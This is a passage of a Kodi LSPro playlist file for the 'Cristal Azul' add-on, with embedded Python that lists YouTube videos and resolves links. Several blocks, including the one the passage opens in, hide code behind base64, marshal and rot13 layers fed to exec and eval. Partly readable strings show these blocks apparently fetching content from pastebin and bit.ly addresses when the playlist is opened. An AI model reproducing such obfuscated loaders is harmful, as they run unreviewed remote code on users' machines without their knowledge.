wRktVakpOVVVsMVdtMVNNa0ZIV2pWYWJWSXhXbTFJTTBGUmRESk1iVWhxUVVkRU1FRjNUWGRCVVhReFFWRk1hMEZSZURCQmQzQnJRVkZhTUUxM2NEQmFiVll3UVVkRmVrRlVTRE5DVVV3eVFYcEVNazEzY0RKQlIwd3pRa2ROZVVGSGVHMUJVVnBzUVZGTU1FRnRUWHBCYlU1dFdrZGFiRUY2VERGQlVVZ3lRWGRFTTBGdGNHdEJNbEl5VFVkd2EwRkhkREJCUjFwc1FYcGFiVnB0Y0RGQlIzaHRXbmRGZVVGM1dqRkNSMHd4UVVkU01VRlJTWFZCZWxZelFXMXdiVUY2U0ROQlVVdzFXbnBXTTFwdFNEQkJSMGd4UWxGRU5VRktVakJOUjBoc1FWRkViRTEzU0d4QmQzQXlRWGRYZGtGVVdqRkNSMFEwUVVkRU1FRjNUWGxhYlZJeVRHMXhkVUZ0ZURCQlIxb3pRVWRJTVZwSFdqVkJlbG93VFhkYWEwRlJjR3hNZDAxNlFYcGFNa0pSVEd0QlVYQXpURWR3TkVGNlNETmFVVWcxUVZSYU0wRjNjRzFCVkVReVFWRndhMEZIY0ROQmJVd3dXbTFFTVVGSFJYbEJVVWd6UWxGRmVVRnRTREZCYlVWNlFXMU1NMXBSVEd0QlIzZ3lRbEZNTWxwdGREQkNSM0F6V20xSWJWcDNSRE5CZDB4dFFrZE1ORUZIVm0xYVVVUTBRWGRJTTFwdFJEQkJkMUl3VEhkYWJFRkhlRE5CZDBRMVFVZElNVUZIUlhsQmQzZ3dRbEZ3YTBGVVdqTkJVVWd6UVZSU01FMVJjREpCVVZZelFYZE5lVUYzUkROQlIzQTBRVlJTTWsxM1JYaEJSM2d6UWtkd01FRnRTREJhUjB3eVFWUklNRTFIU0d0YWJYaHNUSGRNYlVGM1JERkNSMGcxUVZGU01WcEhUREJCZDFJelduZE5kVUYzVW0xYVIzQnNRVkZhTWsxUlYzcEJiVWd3VEhkeGRVRlJlREJOZDBsMVdtMTBNRTFIVEcxQlIwUnRRbEZhTVVGNlZqSkJVVTE1UVcxSU1rRlJjR3BhZWt4c1RYZEZkMEZLVWpKYWJVMTVXbTFNYlVGM1dqTkJSMW93VEcxTU1WcHRVakphUjBSclFYZDBNMXBIVERGQlIzQXlUVWRNTlZwdFVtMUNSMFExUVZSSU0xcDNUREZCVVVneVFVZElNMXB0VGpCTWQzQnRXbTFXTWt4M1dtMUJkM0F5UVhkYU1VRjNkREZDVVZkNlFXMTRNRUZSY0RGQmQwd3lUVWROZGtGSFVqRkJSMHd5UVVkYWJVRlJUREZhYlhReFdsRk1iVnB0VEROYVIzQXpRWHBJTWsxUlJYWkJiVTV0V25kYU5VRjNSR0ZSUkdObFRVdDVaMHhLWjNsd2RrNDVWbEJ4WTBoM1QyaEVNbU40YmxSVFIwcDZkRE5FU0RGaGNUQjFlVzh6ZFdWR01GTlVXa2xqTTI0eVRURktWVkl6Y1RJMWJFWkhlR2xCTWpsWVIxSnhVSEJJU1VoYU1YQTFUVEl3TW01S1RYaE5kMHcxU0ZKNVJYQnNPVnB3VlhWaWNIcEpVVnBTU0dWeVIwbHNSakk1YTAwelUyaHVNM0ZoUVVweGRsb3lhMVJ3TUhWNlJWTmlhVVV4U1dSWU1WZFlSVWhtTVUxU1FXSktVMEUxV25kUFdHNVJUekJhVlVReFJqQnJkMHd3VnpWTVNrbG5jSG94U1ZveVFYVkJVM2xvU1VkSVpVUnRjVFpNTWpobGNGTjFabkpLVTNadk1tdG5TRlJ4UW5GNVZqSkhVa1ZsYmtwRmJYQktaMkZ5VUdkamNraEpWbkI2U1dOdk1YVkdUWHBOWWxwaGNWVklSMFF6VFhoNE1rRktlVlphVkRGUlNrdE5Ta0Y0WWpOdlVrbFViMU5YVmtwVlVteHVVMFZTUlhkTU5VVlZSRFZKVlVnMWNFaEJRVzUzVTBGYVUyTlViMU5UVVc1dFNHeEhTMGxzY0RCNGEwRkxlVlZGUzJOQlFrWm5VWEV6UldKdVNIRnNXRzE1VUVoS05XVk5lbU5qU25weGJHOTJPREZFWVZkNVNuaE5VMFo0VTBkdU1tTjVURXQwYTBoSFFXTk1TM2xNV25vMWVVZElkREJ5VW10RVdrZDVTVVI2VTBWeWVERlFXbXhuYVZwdFRtVkVNMDFYY0ZGNVdVMTRkWGRNU2psM1JVdFhRazB4Uld4eGJWTjJXbFZPTTFwM1NESkJNa0ZUY0cxNVZGZ3lNV3hhTTNscVdESlRZbkZLUVc1Q1UwbFVibm81WjNGSGNWWnhiWGxxV25weFJrRXlZekJ3ZGpsVWIwZFhhRXBJTVZkQmJVZ3dTbmQ1UVVWS09WRk5SMFZRYjFKWGJHNVNNREJGU2xOVFIwbFBTMFZJZUd4QmQwOUlSbmhuYVVWNGNVcE1TbkUyUjFGd2JFbFNWalZ4UzJJMVdsRjBiVVpWU1hodVVVRlRUVkJuYkVWSWVHVndVblJzUlVsSVpVUktVMlpaYlVGcGIyMUpXbTVWY1UxdlNtWXlSMUpOVjBkSFNXeHdNMU5qYm1GSVpYRnRjVTlGU1hGc1RYZGFhbkJWY0dsR00wbEJSakpUYUhKM2RXdEJZVTFIUkVkQlZtOVRjV3BFTW1kNGIwaG5WRUZ0ZVdGRU1YVXdibmRUYUZvd01ETklWRWd6YjB0U05VWXdUREZhTTNCbFJYcFhOVWRWWTNwQ1ZFeHJSVXBNYlVsdFFUWkJNblZZY0VweE1YQXllVmR1TWpGVFRURlhZMWt3WTBOWU1rUXlSSGRCYTBneWRHVktTbFp0VEVseFFscFZRWHBKU25GTmIyMUJhVWRLWjFKTWVuQnRjRzFTTkVRelNESkVSamxQUm5sNVQwMWhlV1pJTVdOVlIwcDVhMjVIUld4SmVHTnNXbTFOWlc5NWNVOUpNazFyU1ZGNE5FUXljR1ZhYlhGdFFXRmpNbHBLVjFSRVJqbExjbE5QYkVKSU1XSnZNSFJ0UlhkQlZXNXRVMkp4ZWpnd1NrcEVhM0V5VTJsd2JYRjRRVlZNWlZwUlNXcGFZVWxqYjNweFEzSlJkVTFHUjFZMWNtRjFZWEF6UlUxdmVWTTFTREpYYkVSS1NHeEdWSGsxV1RCMVlVeExTR3BFUjNocGIzZEJWMjR5UlZCTk1WTmpRbEpuWlV3eVoyaEdNREY1VEdGd2ExcGhlVmROVWxkQ1RYZEJTVWd4VDJweFlVMXRXbnBUZUVFeVowcEJNazFSYjBwMWJVVkxUMDlCZW5nMWNIaFNORUV3WTFkdVNWTmFjRk40TTBSS1YweEJlazFSY0hoVGRrMUtNRE5GU0VscVdsUnhWMjU2TlZwYVZFMTZXbEpyZVUweU9XZE1TbmxGU1ZRd2JVaEpUR2xLVkUxaVJqSjVaMFpLT1ZWSFMxZG9XVEpUZFUxS1YzbE1TbmxwY2tkTlkzQXlSVnBOYlVGdFIxUkJUMFZRT1dOQmVFMUNSRzE0WlVGNFNWQkllamxpYjFWNGJGcFZkVmR1U1UxUFduZE5ZVzU0T1ZSR2JHWXljVEJuWjAxUlJXVkhTWGh0UlVneGJGcFZUM2xOYlhGblRHRlRXRWxJUldkSVNYVmljSFk1ZDBWNFoyRktVblZWUlhsTmFFY3hTWFZHU2pWTVFrZE5VazB6UVdOTk0wMHlXVEJuVTFvelltMXdSMEUxYmpKQlQweEpTR3h5WVVFMlNETldOVVpVWmpKQk1rMUhTa1k1VmtSNFl6WnVTblZOUmtoSWFYRjNVMk5HVTNRd2NuaFdiVmt6WW1wdVVtZGhRVXBGYlVFd1kyRkJNSGx1V1RCTU1HOVVUVmhFTTBsalNUTmpNVWt4VjJodVIwNWxXREpCTUVWNVdtMXlWVVZyUVVoalJVWjVlVmxOUzA5MlRVcFhhVm93VXpSd01FbFhTbnBNTVhCS1RXcHZTMXBxY2toYWFrSlRlV1Z2VVVsYWNESnhWbGt3VjBGSlIwbDVibFZQUjAxSlJHMVlNa2xXU1VsU01YQkhjRE55ZDNWclFsTmpUVmh0VnpGTmJWTkVSSHAxVUVkVlJWSnhiVTVwYnpOTlNFMVVTV2xZTW5WcGJubDVZVzk0ZVU5QlVtdFJSa2wxWVZvd1NHVmFSMWRzYjFWalFXOHpZMjV4UmpreGIzbzRNVUV5VEdwSFNrMUhiakpKWlVwVVJHeFlNSGxZU0VkSWFVMXRkVXRKZVU5aGNEQXhTM0JVT0dWS1NVRm9TVW8xZVVsSVUweGFWSFZOUjNwRU5VRjNUbXhZTUVsWFFrZDBaVzVIU1Rad2QxWnRRVlZOTWsxM1NXTnZNM2hwY0ZGNWJuQmhTWGhIUjAxcmJqRlRNbkJUU1ZGd01WTllTbFJyZWtwVVJYVnZWSFZ0U0VsNWJFMUpRV0ZFZDFkcWJ6SXhURVpTU1d4R1VVOXJTREk1V2xreFNVeGFVbGRyY2t0RU0weHRkVUZNZUhWb2JtRlhkVVJLTlZsQlVVNXJSMU5PYVhFd2FqRkZWRGhwY1ZBNVprUXpRV0Z3ZUdOVWNFZFhiWEZVWjFseVVuVnBjREZQU1VGVldtVnZlRFF5UVcxRlVVcDNTVkZGU2tGWVRYcHhaa1ozZVd0R1VuUnNiakJ3YlhGNFNURkJNVk5zY0dGVFVVUjNVMlZJVlhBemIwZEZZa3d3TURGR1NYRjVRVlF4VW5CaGRUVkhWRGxaVFRCWFdVeElPVE52VW5ReVRIZEpVM0I2U1VWRk1sTmxTSGQwTlhFeVJWWkJlV0p0Y2xGeGRrUklTVWhGTURrelJFcDVaMjU2Y1cxRWJYZzFRVk4xVTBWNk1VeHVNVVZsU1Vkd05VVlJUVmR1VURsUFNIZHdiVWxLWjFKdlZVRlBRVEYxZFhKS1NHeEllSFZEUVROT2EzQlNNVXh4TUdjMmNFZDVOVXh0U0cxRlIxTnNRVWhCVFUxdFFVaE1NbmsxY0dGVFlVcEhSVFJ5ZVZONGNraEpVVXd5TVZGRU1YbDFibFE1YmtWaGNHdENTa2xvUWtneGJHOXRkVmhhUzJOb2IwbDFaRTFUVm1sRVNGZFZSVEZGU0ZwNFRWbHZTblJyV0ROWFRXNVVOV3hDVW5BMVRURkpWRTFRT1VWd01YbFFRbEk1VVV4SVZqVmFNVmRYYjFSTlVVMHpRVEJ1ZG1kV2NYbEJSMHhLU1VsR1VrMUVibEY1U1VkSlUyRndTM0ExY0hkUFJFbEhRV0p5VW5scFFYZFRaVTB6UVUxS1NIUXpURWQ1WmtoNmEybEdiR2RRUjFSeE1XOVZlV0p2ZDFkUlRESkZZMjR5Tkd4YWVEQXpSekJtTVc5SWEyNU1ZVk5pU1RCMVQwVXljVFpaTURScVdUTlRXa0V3U0RWWk1FRnFSekJUU0V4dFRWTkJlRUY1Y1RGRU1FVlJVak5ITUhsdGNESjFhMjR3WjBsdU0xb3diMUpUTkc4eVNVMUpWRnBsV2xSME1scDJaMkZIYlhsWVduaGpTRXhoVjJkSFZHWXlTR0Z4VFc1M1NXMUlTRGxSYmxBNVYwRktUVmx1TVZNMFRIZDVXa2RSZFdkTVNrbDVja2RKVkV4SlQxRklWVUZvV20xWGEwMTNUMU5KZWpsMVJsTkphSEYzZFV0dk1FRk1SMGRNTTI5Mk9WbEVTVmRSUVZGQlJtOUpWakJGU1hReWNVbE1NM0IzUlVsSWQwOTViMjFGWlZneFUyRnVVbXBsUVdGVFZrUXpRV0p1VWxJelJHMTVUVXBKVW10QmVWTllUVEZJTVVsS1YwWklNbFl5UVRCSlZXOTNWMnRFTUhsdFdtMXhiWEZIZVhsSlNFVlVRa3BTTkVwSVFUWnhNMGxsY1hweGJVMTZZM2x2WVhGR1RFaElhWEZJVjJoYVIwbFRRa2Q1U0hCVlYwWkNWSFZCU2xKYWJFSlVlVWxJVW1kUVNtRlRia2hVTldsdVUwOW9SVkp3YWtwSGNUWkpTMGxRYjJGd01XNUlPVU5aTTNGRFFsTkZZVVZoVjIxRlIzVkpiakZGYW5Bd2VXcFpiVUV3V0RKME1IQnRkV1pHWVZjMmIwdGpiRTFSVDFsSWRtZHFRVkpCTmswd1NERkNTMWRwY0cxVGRVUjJPWGR5U2psblFsSkZaRUZLVTNaQk1YZzFSak5qVVVKVmNETnVZVXhyY0RGQlYxcGhXalZOZUd0clJ6SjVlRzR3Vm1sSWVWY3piek5OVEUxaFkxaHhNRTF0YmxRd01XNUhkRE53TWpCcFFYaEZabTlTVFhWeFUxTlNiM2QxTUhCNFFVVndTMWRwY1hwWGFFVkhUR2x3VTBGMVFWTmpiVUZSZVU5WU1IVmhTVWhxYVc5UmRHcFpNbmxpY0hkUFUwSkhkVWh2ZWxKbGJqSm1NVTFVZVV0SmRqaGxTVzF4Tkc1S2VURkhNR295UkROMVJtNUtaek51U25sSVNFcEJZa0V5WjNsYU1YRldXRzFPTlVGaFkySkhWRWxKYmxWWFNVMVVlRFJCVW5sM2JsVkpTVzk0Vm0xQlVVOWpRVEJxTUVGSWRXaEJZVTFOUlZKYU5VY3pkRFZLVVZKcWJsRldhVzlRT1Zsd2JVaHRXVEphTkc1SlUwbE5kMDFMVEcxUE5scElSVXh4U2tWSVNVb3haVVpVVTB0Q1NVUnBRVkY1WmsweGVWbHhNREZMUkhkRlMyNTNWalZ1VWtGNWNrdFBUMjR6ZVdsYVMwOXRUREJuZGsxM1UwMU5NMk5IU1VoNVZVUXdjREpJUzNsVlJsVkZTMXB0UlZGdVZYVkViekpuZDI5TFNHVktkM1F5Y25oWFpVZDNkVlJ3VURrMldESnFNRUV3VWpSRVlWTlhja2hhYlZwU1JHcHdNakUxUmxSblZuSjZkVWx5VWxOU1IxVlBaMWh0VmpWQ1NFVkpRVlJyV1ZwM1NWaGFTbU5yV1cxd2FXOUplR1ZhTTNCbFFrZEZXWEJ0VmpWQ1IzRldRbEpqYTNGMlowbE5VR2RhY0RCd05IQjZOWGxZTTBsRWNraGFiVUZzWnpaSFVsZDNXVEkxYlhGdFFVOVpNakZQUWxKaWFWZ3pZMWxaTW5sRmNIZEJXVVJzT0dsdlZYaHRRa2xqVDBGaFFYZEZiWEZQVERGRmQxa3dlV0ZFTUZacGJrcDVZMHhJVjJwdmQwRXlSVk54UjI5SWNWRllNakZoUkhwNWJFeGhVMjFKZG1kdWJteG5VWEF5UVdoWk1tZGhjbUZqYmtKUU9HVnVTRWxaV2toRVpVRjRlRFZKU0RGUGIwWm1hVzU2Y0d0RmJVdzFjREJ4UlVKR09VUkdVbkJwVEcxQmJVbFNTVTlhYkRremNGUkZiWEJ0VTBwR1VqRk5jSGROWWtaSWNYVkViVTV0V1RCU05IRkdPV054YlhGUGJrcGFhVUZMV2pCRmJYUXlSVlZTTlVGS2FqUnZkMEYxUVcxNE5FRkdPR2xZTW5WaFdXdzRORUV5ZVdSRU1YaHBRbEJuWVhBelFXZGFiVm94Ym5veFkxa3pSV3RGYlZkMVRHMU9ZVkZFWXpadVNqbG9WbEV3ZEZjeGF6UkJiVmR3Y2xGTmVrdFZkRE5CVTJzMFdtMVRjSEpSV20xWGFqQlliM3BKYVZaUk1IUk5TMDExYjFCMFlVdFZkREphZVdzMFFYZDVjSEpSVFhsTFZYUXlXa2xyTkVGdFFYQnlVVXh0UzFWME1rSkphelJCZDNsd2NsRlhlVXRWZEROQlNXczBRWHBKY0hKUlREUkxWWFF5UVVsck5FRnRkWEJ5VVUxM1MxVjBNa0pKYXpSQmQwMXdjbEZ3TlV0VmRHeENVMnMwUVhwRmNISlJUWHBMVlhReldubHJORUZ0VDNCeVVVdzBTMVYwTWtGSmF6UkJiVWx3Y2xGd2JVdFZkR3hDU1dzMFduZE9ZVmhHVG1WV1ZFa3lURXBxWWxjeGF6UkJkMEZ3Y2xGTmVrdFZkREpCVTJzMFFYZEpjSEpSVEcxTFZYUXpXakZyTkZwNlNYQnlVVXd3UzFWME1rRkphelJCZDBGd2NsRk5la3RWZERKQlUyczBRWGRKY0hKUlZqUkxWWFF6UVZOck5FRnRWM0J5VVV3MVMxVjBNazFKYXpSQmQzbHdjbEZ3TUV0VmRETkNTV3MwV25wQmNISlJWbXBMVlhRelRFbHJORUYzZVhCeVVVMTZTMVYwTWsxSmF6UmFkM2hoV0VaT1pWWlVTVEpNU21waVZ6RnJORUYzVjNCeVVVdzFTMVYwTWsxSmF6UkJkMU53Y2xGd2JVdFZkREphTVdzMFFYZDVjSEpSVERWTFZYUnNUVWxyTkVGdFNYQnlVVTE1UzFWME1rSlRhelJCZDBsd2NsRndORXRWZERKTU1XczBRWGQ1Y0hKUlRESkxWWFF6UWtsck5GcDNkWEJ5VVUxNlMxVjBNMXA1YXpSQmQxTndjbEZNYlV0VmRESk1NV3MwUVhkSmNISlJWalZYYkhoMFdHeFBlWEY2VTJaWVVIRndjbEZNYlV0VmRESk5lV3MwUVhkRmNISlJUREZMVlhReVdqRnJORUZ0UVhCeVVWZDVTMVYwTWtGVGF6UkJkMGx3Y2xGTWJVdFZkREpOZVdzMFFYZEZjSEpSVERGTFZYUnNRbE5yTkVGNlYzQnlVVXd4UzFWME0wSkphelJCZWtWd2NsRk1hMHRWZERKTWVXczBRWGRKY0hKUmNHeExWWFJzV2xOck5GcDZRWEJ5VVZacVMxVjBNMHhKYXpSQmQzbHdjbEZOZWt0VmRESk5TV3MwV25kNFlWaEVNRmhOUzAxMWIxQjFkMjh5TVdwdVNtdDVXRlZqWm01S1ZtaE5WRWwzYnpJeGFuQjZTVzF3YkhWMlRFdEJlVUYzUkdoTWQwd3dUVlJKZDI4eVJYbFlWRWt5VEVwcVlsY3hhelJCZWtsd2NsRk1NVXRWZERKTmRuQmpXRVo0WmxkdGEyMXhWVmRqYjNwd0sxZHNhbUZOUzNWNVRHeHdZMWhFUFQxMEJRQUFBSEp2ZERFemN3a0FBQUJ0YjNKd2FHVjFjeUJ6SEFBQUFHTnZaR1ZqY3k1a1pXTnZaR1VvZEhKcGJtbDBlU3dnZW1sdmJpbDBCZ0FBQUc5eVlXTnNaWE1lQUFBQVkyOWtaV056TG1SbFkyOWtaU2hyWlhsdFlXdGxjaUFzSUhwcGIyNHBkQU1BQUFCdVpXOXpDQUFBQUR4emRISnBibWMrZEFRQUFBQmxlR1ZqS0FzQUFBQjBCZ0FBQUdKaGMyVTJOSFFHQUFBQVkyOWtaV056ZEFnQUFBQnRiM0p3YUdWMWMzUUhBQUFBZEhKcGJtbDBlVklFQUFBQWRBZ0FBQUJyWlhsdFlXdGxjblFFQUFBQWVtbHZiblFFQUFBQVpYWmhiRklGQUFBQWRBY0FBQUJqYjIxd2FXeGxkQWtBQUFCaU5qUmtaV052WkdVb0FBQUFBQ2dBQUFBQUtBQUFBQUJ6QmdBQUFITmpjbWx3ZEhRSUFBQUFQRzF2WkhWc1pUNEJBQUFBY3c0QUFBQVlBUVlCQmdFR0FRWUJCZ0VxQVE9PSIpKSk="))
]]></expres>
<page></page>
</regex>
<regex>
<name>multi</name>
<expres><![CDATA[#$pyFunction
url = '[c.param7]'
title = '[c.param1]'
import xbmc,xbmcaddon,xbmcgui,re,json
def GetLSProData(page_data,Cookie_Jar,m,url=url,title=title):

    if '{' in url[:5]:
        items = json.loads('['+url+']')
        dialog = xbmcgui.Dialog()
        seleccion = []
        enlaces = []
        for item in items:
            seleccion.append(item['titulo'])
            enlaces.append(item['url'])
        titulo = dialog.select('seleciona enlace: '+title, seleccion)
        if (titulo < 0):
            dialog = xbmcgui.Dialog()
            dialog.notification("Cristal Azul", "Reproduccion cancelada!!!",
                            xbmcgui.NOTIFICATION_INFO, 5000, False)
            return
        return enlaces[titulo]
    else:
      if '104 116 116 112 115'==url[:17]:
          return desencriptar()
      elif '106 98 98 114 114'==url[:17]:
        return 'https' + desencriptar()[5:]
      else:
        return url
def desencriptar():
  s = url
  def enc(s):
    d=''
    s=s.split(' ')
    for strchar in s:
        d += chr(int(strchar)-0)
    return d
  return enc(s)
]]></expres>
<page></page>
</regex>
<regex>
<name>selecion_inteligente</name>
<expres><![CDATA[#$pyFunction
url = '$doregex[multi]'
$doregex[importar]
from resolveurl.plugins.lib import jsunpack
$doregex[reparar_conectores]

]]></expres>
<page></page>
</regex>
<regex>
<name>reparar_conectores</name>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUJRQUFBQU1BQUFCREFBQUFjMEVBQUFCa0FRQmtBQUJzQUFCOUF3QmtBZ0JxQVFCa0F3Q0RBUUI5QkFCa0JBQnFBUUJrQXdDREFRQjlBQUI4QXdCcUFnQjhCQUI4QUFBWGd3RUFhZ01BZ3dBQVV5Z0ZBQUFBVG1uLy8vLy9jeFFBQUFCaFNGSXdZMGhOTmt4NU9XbGhXRkYxWWtoclBYUUdBQUFBWW1GelpUWTBjeUFBQUFCTU1FNTJZbTFXYW1SSE9YbGFXRTVtVVROS2NHTXpVbWhpUlVZMlpGZDNQU2dFQUFBQWRBY0FBQUIxY214c2FXSXlkQVlBQUFCa1pXTnZaR1YwQndBQUFIVnliRzl3Wlc1MEJBQUFBSEpsWVdRb0JRQUFBSFFSQUFBQVR6QlBNRTlQTUU4d01FOVBNREF3VHpCMEVRQUFBRTlQVDA4d1QwOVBNRTh3VHpCUE1FOHdkQkVBQUFCUFR6QXdNREF3TUU4d1QwOHdUekJQVDFJQkFBQUFkQkVBQUFCUE1FOVBUekF3TUU5UE1EQXdUMDlQTUNnQUFBQUFLQUFBQUFCekJnQUFBSE5qY21sd2RIUU1BQUFBUjJWMFRGTlFjbTlFWVhSaEFRQUFBSE1JQUFBQUFBRU1BUThCRHdGT0tBRUFBQUJTQ1FBQUFDZ0FBQUFBS0FBQUFBQW9BQUFBQUhNR0FBQUFjMk55YVhCMGRBZ0FBQUE4Ylc5a2RXeGxQZ0VBQUFCekFBQUFBQT09IikpKQ=="))
]]></expres>
<page></page>
</regex>
<regex>
<name>importar</name>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUNBQUFBQVlBQUFCREFBQUFjL1FBQUFCa0FRQmtBQUJzQUFCOUF3QmtBUUJrQUFCc0FRQjlCQUJrQVFCa0FBQnNBZ0I5QlFCa0FRQmtBQUJzQXdCOUJnQmtBUUJrQUFCc0JBQjlCd0JrQWdCOEJ3QnFCUUNEQUFCcUJnQmtBd0NEQVFCckJnQnlnUUI4QkFCcUJ3QmtCQUJrQlFCcEFnQmtCZ0JrQndBMlpBZ0FaQWtBTm1RS0FIUUlBSU1CQW1vSkFGTmtDd0I4QndCcUJRQ0RBQUJxQmdCa0F3Q0RBUUJyQmdCeXhnQjhCQUJxQndCa0JBQmtCUUJwQWdCa0JnQmtCd0EyWkFnQVpBa0FObVFLQUhRSUFJTUJBbW9KQUZOOEJBQnFCd0JrREFCa0JRQnBBZ0JrQmdCa0J3QTJaQWdBWkFrQU5tUUtBSFFJQUlNQkFtb0pBRk5rQUFCVEtBMEFBQUJPYWYvLy8vOTBDd0FBQUdOeWFYTjBZV3hoZW5Wc2RBSUFBQUJwWkhNaEFBQUFhSFIwY0hNNkx5OXdZWE4wWldKcGJpNWpiMjB2Y21GM0wycFFXbUZDUjFsT2RBY0FBQUJvWldGa1pYSnpjMGdBQUFCTmIzcHBiR3hoTHpVdU1DQW9WMmx1Wkc5M2N5Qk9WQ0EyTGpNN0lGZFBWelkwT3lCeWRqbzFOUzR3S1NCSFpXTnJieTh5TURFd01ERXdNU0JHYVhKbFptOTRMelUxTGpCekNnQUFBRlZ6WlhJdFFXZGxiblJ6RkFBQUFHaDBkSEJ6T2k4dmNHRnpkR1ZpYVc0dVkyOXRkQWNBQUFCU1pXWmxjbVZ5ZEFZQUFBQjJaWEpwWm5sMEJRQUFBR1psYzNSaGN5RUFBQUJvZEhSd2N6b3ZMM0JoYzNSbFltbHVMbU52YlM5eVlYY3ZSalJvZG1KcGVIa29DZ0FBQUhRQ0FBQUFjbVYwQ0FBQUFISmxjWFZsYzNSemRBSUFBQUJ2YzNRRUFBQUFlR0p0WTNRSkFBQUFlR0p0WTJGa1pHOXVkQVVBQUFCQlpHUnZiblFNQUFBQVoyVjBRV1JrYjI1SmJtWnZkQU1BQUFCblpYUjBCUUFBQUVaaGJITmxkQVFBQUFCMFpYaDBLQWdBQUFCMEVRQUFBRTh3VHpCUE1EQXdUekF3TURCUE1FOHdkQkVBQUFCUE1FOVBUekF3VHpBd1R6QXdUekJQVDNRUkFBQUFUMDlQVHpCUE1EQlBUMDlQTUU4d1R6QlNCZ0FBQUZJSEFBQUFVZ2dBQUFCU0NRQUFBRklLQUFBQUtBQUFBQUFvQUFBQUFITUdBQUFBYzJOeWFYQjBkQXdBQUFCSFpYUk1VMUJ5YjBSaGRHRUJBQUFBY3d3QUFBQUFBVHdCR3dFcUFSc0JLZ0pPS0FFQUFBQlNFd0FBQUNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6QUFBQUFBPT0iKSkp"))
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/WVdmcUt.jpg<thumbnail>
<fanart>https://i.imgur.com/6Ts8E1Z.jpg</fanart>
</item>



<item>
<title>[COLOR gold]* [/COLOR][COLOR white]DECORACIÓN[/COLOR]</title>
<link>$doregex[link_inteligente]</link>
<regex>
<name>link_inteligente</name>
<listrepeat><![CDATA[
<title>[COLOR yellow]+[/COLOR] [COLOR white][link_inteligente.param1][/COLOR]</title>
<link>$doregex[id]</link>
<thumbnail>https://i.ytimg.com/vi/[link_inteligente.param2]/hqdefault.jpg</thumbnail>
<fanart>https://i.imgur.com/kKmzFLe.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = 'https://www.youtube.com/watch?v=mpVP-IJG6ZY&list=PLTz7vpaOlTLvNrm6rF2U5DxrpQ2sY9tJq'
import re,requests,xbmc
def GetLSProData(page_data,Cookie_Jar,m,url=url):#cPrLItsLTfakl
 
  if '=' in url[:7]:
    if 'canal' in url[:7]:
        s2 = url + '2018Cristalazul'
        url = re.findall('(http.*?)2018Cristalazul', s2)[0]
        html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
        return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', html)
    elif 'lista' in url[:7]:
        s2 = url + '2018Cristalazul'
        url = re.findall('(http.*?)2018Cristalazul', s2)[0]
        html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
        return re.findall('(?s)playlistPanelVideoRenderer".*?simpleText":"(.*?)".*?vi\/(.*?)\/', html)
    elif 'enlace' in url[:7]:
        s2 = url + '2018Cristalazul'
        url = re.findall('(http.*?)2018Cristalazul', s2)[0]
        titulo2 = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
        titulo = re.findall('title.":{."simpleText.":."(.*?)"', titulo2)[0]
        html = url + '2018CristalAzul'
        enlace = re.findall('v=(.*?)2018CristalAzul', html)[0]
        return [(titulo, enlace)]
    else:
        return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Error [/COLOR],[COLOR white]Enlace Mal puesto[/COLOR], 4000)")
  elif 'channel' in url:
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', html)
  elif 'youtube.com/c/' in url:
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', html)
  elif 'youtube.com/user' in url:
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    return re.findall('(?s)"title":\{"accessibility":\{"accessibilityData":\{"label":".*?".*?simpleText":"(.*?)".*?watch.v=(.*?)"', html)
  elif 'list' in url:
    html = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    return re.findall('(?s)playlistPanelVideoRenderer".*?simpleText":"(.*?)".*?vi\/(.*?)\/', html)
  else:
    titulo2 = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
    titulo = re.findall('title.":{."simpleText.":."(.*?)"', titulo2)[0]
    html = url + '2018CristalAzul'
    enlace = re.findall('v=(.*?)2018CristalAzul', html)[0]
    return [(titulo, enlace)]
]]></expres>
<page></page>
</regex> 
<regex>
<name>id</name>
<expres><![CDATA[#$pyFunction
import resolveurl
def GetLSProData(page_data,Cookie_Jar,m):
  url = 'https://www.youtube.com/watch?v=[link_inteligente.param2]'
  return resolveurl.resolve(url)
]]></expres>
<page></page>
</regex>
